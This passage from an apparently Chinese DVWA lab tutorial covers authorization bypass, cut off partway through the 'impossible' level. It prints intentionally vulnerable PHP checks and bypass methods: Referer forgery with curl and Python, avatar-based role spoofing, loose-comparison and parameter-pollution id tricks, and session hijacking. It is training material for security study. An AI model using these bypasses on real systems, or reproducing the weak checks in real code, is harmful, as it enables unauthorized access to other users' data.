<span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取用户ID</span></span><br><span class="line"><span class="variable">$userId</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ 改进：检查用户权限 ★★★</span></span><br><span class="line"><span class="comment">// 但检查逻辑有漏洞</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">isAdmin</span>(<span class="variable">$currentUser</span>)) &#123;</span><br><span class="line">    <span class="comment">// ★★★ 问题：只检查是否是管理员，不检查是否查看自己的数据 ★★★</span></span><br><span class="line">    <span class="comment">// 非管理员应该只能查看自己的数据，但这里没有检查</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Access denied: Admin only&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 后续操作...</span></span><br><span class="line"><span class="comment">// 查询、删除、修改用户</span></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="新增防护"><a href="#新增防护" class="headerlink" title="新增防护"></a>新增防护</h3><ol>
<li><strong>Referer检查</strong> - 验证请求来源</li>
<li><strong>角色检查</strong> - 判断是否是管理员</li>
<li><strong>拒绝无Referer的请求</strong></li>
</ol>
<h3 id="仍存在的漏洞"><a href="#仍存在的漏洞" class="headerlink" title="仍存在的漏洞"></a>仍存在的漏洞</h3><p><strong>核心问题：</strong></p>
<ol>
<li><strong>Referer可伪造</strong> - 这不是可靠的安全措施</li>
<li><strong>角色检查逻辑弱</strong> - 基于avatar字段判断</li>
<li><strong>没有检查资源所有权</strong> - 管理员检查不够</li>
<li><strong>Session劫持</strong> - 如果获取管理员Session，可以绕过</li>
</ol>
<h3 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h3><h4 id="方法1：伪造Referer头"><a href="#方法1：伪造Referer头" class="headerlink" title="方法1：伪造Referer头"></a>方法1：伪造Referer头</h4><p><strong>使用Burp Suite：</strong></p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/vulnerabilities/authbypass/?id=2</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>dvwa.local</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://dvwa.local/vulnerabilities/authbypass/index.php</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>security=medium; PHPSESSID=your_session</span><br><span class="line"></span><br><span class="line"><span class="language-lasso">结果：通过<span class="keyword">Referer</span>检查</span></span><br></pre></td></tr></table></figure>

<p><strong>使用curl：</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -X GET <span class="string">&quot;http://dvwa.local/vulnerabilities/authbypass/?id=2&quot;</span> \</span><br><span class="line">     -H <span class="string">&quot;Referer: http://dvwa.local/vulnerabilities/authbypass/&quot;</span> \</span><br><span class="line">     -H <span class="string">&quot;Cookie: security=medium; PHPSESSID=your_session&quot;</span></span><br></pre></td></tr></table></figure>

<p><strong>使用Python：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://dvwa.local/vulnerabilities/authbypass/&quot;</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;http://dvwa.local/vulnerabilities/authbypass/index.php&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&#x27;security&#x27;</span>: <span class="string">&#x27;medium&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;PHPSESSID&#x27;</span>: <span class="string">&#x27;your_session&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">params = &#123;<span class="string">&#x27;id&#x27;</span>: <span class="number">2</span>&#125;</span><br><span class="line"></span><br><span class="line">response = requests.get(url, params=params, headers=headers, cookies=cookies)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;User ID:&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Bypassed referer check!&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure>

<h4 id="方法2：利用角色检查漏洞"><a href="#方法2：利用角色检查漏洞" class="headerlink" title="方法2：利用角色检查漏洞"></a>方法2：利用角色检查漏洞</h4><p><strong>如果avatar字段可修改：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 修改自己的avatar包含&quot;admin&quot;字符串</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;user_id&#x27;</span>: <span class="number">5</span>,  <span class="comment"># 当前用户ID</span></span><br><span class="line">    <span class="string">&#x27;avatar&#x27;</span>: <span class="string">&#x27;images/admin_avatar.jpg&#x27;</span>,  <span class="comment"># 包含&quot;admin&quot;</span></span><br><span class="line">    <span class="string">&#x27;update&#x27;</span>: <span class="string">&#x27;Update&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">requests.post(url, data=data, headers=headers, cookies=cookies)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 现在被识别为管理员，可以访问所有功能</span></span><br></pre></td></tr></table></figure>

<h4 id="方法3：会话固定-x2F-劫持"><a href="#方法3：会话固定-x2F-劫持" class="headerlink" title="方法3：会话固定&#x2F;劫持"></a>方法3：会话固定&#x2F;劫持</h4><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">1.</span> 获取管理员的Session ID（通过XSS、网络嗅探等）</span><br><span class="line"><span class="bullet">2.</span> 使用管理员的Session访问</span><br><span class="line"><span class="bullet">3.</span> 绕过所有权限检查</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="High-难度"><a href="#High-难度" class="headerlink" title="High 难度"></a>High 难度</h2><h3 id="攻击目标-2"><a href="#攻击目标-2" class="headerlink" title="攻击目标"></a>攻击目标</h3><p>使用Anti-CSRF Token，但仍有逻辑漏洞。</p>
<h3 id="后端代码分析-2"><a href="#后端代码分析-2" class="headerlink" title="后端代码分析"></a>后端代码分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取当前用户</span></span><br><span class="line"><span class="variable">$currentUser</span> = <span class="title function_ invoke__">dvwaCurrentUser</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$currentUser</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ 新增：Anti-CSRF Token验证 ★★★</span></span><br><span class="line"><span class="comment">// 检查是否提交了表单</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 验证CSRF Token ★★★</span></span><br><span class="line">    <span class="comment">// 从POST数据获取token</span></span><br><span class="line">    <span class="variable">$userToken</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;user_token&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="comment">// 从Session获取token</span></span><br><span class="line">    <span class="variable">$sessionToken</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;session_token&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// checkToken() - 验证CSRF token</span></span><br><span class="line">    <span class="comment">// 参数1：用户提交的token</span></span><br><span class="line">    <span class="comment">// 参数2：Session中的token</span></span><br><span class="line">    <span class="comment">// 参数3：失败后重定向的页面</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">checkToken</span>(<span class="variable">$userToken</span>, <span class="variable">$sessionToken</span>, <span class="string">&#x27;index.php&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;CSRF token validation failed&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ 改进：基于数据库的角色检查 ★★★</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getUserRole</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 从数据库查询用户角色</span></span><br><span class="line">    <span class="comment">// 假设users表有role字段：&#x27;admin&#x27; 或 &#x27;user&#x27;</span></span><br><span class="line">    <span class="variable">$query</span> = <span class="string">&quot;SELECT role FROM users WHERE user = ?&quot;</span>;</span><br><span class="line">    <span class="variable">$stmt</span> = <span class="title function_ invoke__">mysqli_prepare</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>], <span class="variable">$query</span>);</span><br><span class="line">    <span class="title function_ invoke__">mysqli_stmt_bind_param</span>(<span class="variable">$stmt</span>, <span class="string">&#x27;s&#x27;</span>, <span class="variable">$username</span>);</span><br><span class="line">    <span class="title function_ invoke__">mysqli_stmt_execute</span>(<span class="variable">$stmt</span>);</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_stmt_get_result</span>(<span class="variable">$stmt</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$result</span> &amp;&amp; <span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$result</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$result</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$row</span>[<span class="string">&#x27;role&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;user&#x27;</span>; <span class="comment">// 默认为普通用户</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查用户角色</span></span><br><span class="line"><span class="variable">$userRole</span> = <span class="title function_ invoke__">getUserRole</span>(<span class="variable">$currentUser</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取要访问的用户ID</span></span><br><span class="line"><span class="variable">$userId</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>] ?? <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ 改进：根据角色限制访问 ★★★</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$userRole</span> != <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">    <span class="comment">// ★★★ 问题：虽然检查了角色，但逻辑仍有漏洞 ★★★</span></span><br><span class="line">    <span class="comment">// 非管理员只能访问自己的数据</span></span><br><span class="line">    <span class="comment">// 但没有正确验证$userId是否是当前用户</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取当前用户的ID</span></span><br><span class="line">    <span class="variable">$currentUserId</span> = <span class="title function_ invoke__">getCurrentUserId</span>(<span class="variable">$currentUser</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 逻辑漏洞：类型比较 ★★★</span></span><br><span class="line">    <span class="comment">// $_GET[&#x27;id&#x27;]是字符串，$currentUserId是整数</span></span><br><span class="line">    <span class="comment">// 如果使用==而不是===，可能被绕过</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$userId</span> != <span class="variable">$currentUserId</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Access denied: You can only view your own data&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ 管理员可以访问所有用户数据 ★★★</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$userRole</span> == <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">    <span class="comment">// 管理员权限：查看、修改、删除任何用户</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查询用户信息</span></span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;SELECT * FROM users WHERE user_id = ?&quot;</span>;</span><br><span class="line"><span class="variable">$stmt</span> = <span class="title function_ invoke__">mysqli_prepare</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>], <span class="variable">$query</span>);</span><br><span class="line"><span class="title function_ invoke__">mysqli_stmt_bind_param</span>(<span class="variable">$stmt</span>, <span class="string">&#x27;i&#x27;</span>, <span class="variable">$userId</span>);</span><br><span class="line"><span class="title function_ invoke__">mysqli_stmt_execute</span>(<span class="variable">$stmt</span>);</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_stmt_get_result</span>(<span class="variable">$stmt</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$result</span> &amp;&amp; <span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$result</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 显示用户信息</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;User Information&lt;/h2&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;User ID: &quot;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$user</span>[<span class="string">&#x27;user_id&#x27;</span>]) . <span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Username: &quot;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$user</span>[<span class="string">&#x27;user&#x27;</span>]) . <span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    <span class="comment">// ★★★ 改进：不再显示密码哈希 ★★★</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 生成新的CSRF token</span></span><br><span class="line"><span class="title function_ invoke__">generateSessionToken</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="新增防护-1"><a href="#新增防护-1" class="headerlink" title="新增防护"></a>新增防护</h3><ol>
<li><strong>Anti-CSRF Token</strong> - 防止跨站请求伪造</li>
<li><strong>基于数据库的角色</strong> - 从数据库读取用户角色</li>
<li><strong>资源所有权检查</strong> - 验证用户是否可以访问该资源</li>
<li><strong>使用预编译语句</strong> - 防止SQL注入</li>
</ol>
<h3 id="仍存在的漏洞-1"><a href="#仍存在的漏洞-1" class="headerlink" title="仍存在的漏洞"></a>仍存在的漏洞</h3><p><strong>核心问题：</strong></p>
<ol>
<li><strong>类型比较漏洞</strong> - 使用<code>!=</code>而不是<code>!==</code></li>
<li><strong>参数篡改</strong> - 可以尝试各种输入绕过检查</li>
<li><strong>逻辑漏洞</strong> - 某些边界情况未考虑</li>
</ol>
<h3 id="绕过方法-1"><a href="#绕过方法-1" class="headerlink" title="绕过方法"></a>绕过方法</h3><h4 id="方法1：类型混淆绕过"><a href="#方法1：类型混淆绕过" class="headerlink" title="方法1：类型混淆绕过"></a>方法1：类型混淆绕过</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 代码中：</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$userId</span> != <span class="variable">$currentUserId</span>) &#123;</span><br><span class="line">    <span class="comment">// 拒绝访问</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 问题：$userId是字符串，$currentUserId是整数</span></span><br><span class="line"><span class="comment">// PHP的弱类型比较可能导致绕过</span></span><br></pre></td></tr></table></figure>

<p><strong>测试：</strong></p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">当前用户ID: 5</span><br><span class="line"></span><br><span class="line">尝试：</span><br><span class="line">?<span class="attribute">id</span>=5    → 通过（相等）</span><br><span class="line">?<span class="attribute">id</span>=5.0  → 可能通过（5 != 5.0 is <span class="literal">false</span>）</span><br><span class="line">?<span class="attribute">id</span>=5e0  → 可能通过（科学计数法）</span><br><span class="line">?<span class="attribute">id</span>=05   → 可能通过（前导零）</span><br></pre></td></tr></table></figure>

<h4 id="方法2：参数污染"><a href="#方法2：参数污染" class="headerlink" title="方法2：参数污染"></a>方法2：参数污染</h4><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=<span class="number">5</span>&amp;<span class="built_in">id</span>=<span class="number">2</span></span><br><span class="line"></span><br><span class="line">某些服务器配置下，可能导致：</span><br><span class="line">- 第一个<span class="built_in">id</span>用于检查（通过）</span><br><span class="line">- 第二个<span class="built_in">id</span>用于查询（访问user_id=<span class="number">2</span>）</span><br></pre></td></tr></table></figure>

<h4 id="方法3：会话固定"><a href="#方法3：会话固定" class="headerlink" title="方法3：会话固定"></a>方法3：会话固定</h4><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">1.</span> 创建新账户（普通用户）</span><br><span class="line"><span class="bullet">2.</span> 修改数据库，将角色改为admin（如果有SQL注入）</span><br><span class="line"><span class="bullet">3.</span> 或窃取管理员Session</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="Impossible-难度"><a href="#Impossible-难度" class="headerlink" title="Impossible 难度"></a>Impossible 难度</h2><h3 id="攻击目标-3"><a href="#攻击目标-3" class="headerlink" title="攻击目标"></a>攻击目标</h3><p>完善的权限检查，真正安全。</p>
<h3 id="后端代码分析-3"><a href="#后端代码分析-3" class="headerlink" title="后端代码分析"></a>后端代码分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ Impossible: 完善的权限管理 ★★★</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取当前用户</span></span><br><span class="line"><span class="variable">$currentUser</span> = <span class="title function_ invoke__">dvwaCurrentUser</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$currentUser</span>) &#123;</span><br><span class="line">    <span class="comment">// 未登录，重定向</span></span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ 核心防护1：验证CSRF Token ★★★</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">checkToken</span>(</span><br><span class="line">        <span class="variable">$_REQUEST</span>[<span class="string">&#x27;user_token&#x27;</span>],</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;session_token&#x27;</span>],</span><br><span class="line">        <span class="string">&#x27;index.php&#x27;</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ 核心防护2：完善的权限检查类 ★★★</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Authorization</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取用户角色</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getUserRole</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$db</span>; <span class="comment">// PDO连接</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// ★★★ 使用PDO预编译 ★★★</span></span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&#x27;SELECT role FROM users WHERE user = :username&#x27;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bindParam</span>(<span class="string">&#x27;:username&#x27;</span>, <span class="variable">$username</span>, PDO::<span class="variable constant_">PARAM_STR</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line"></span><br><span class="line">        <span class="variable">$result</span> = <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetch</span>(PDO::<span class="variable constant_">FETCH_ASSOC</span>);</span><br><span class="line"></span><br><span class="line">        <span 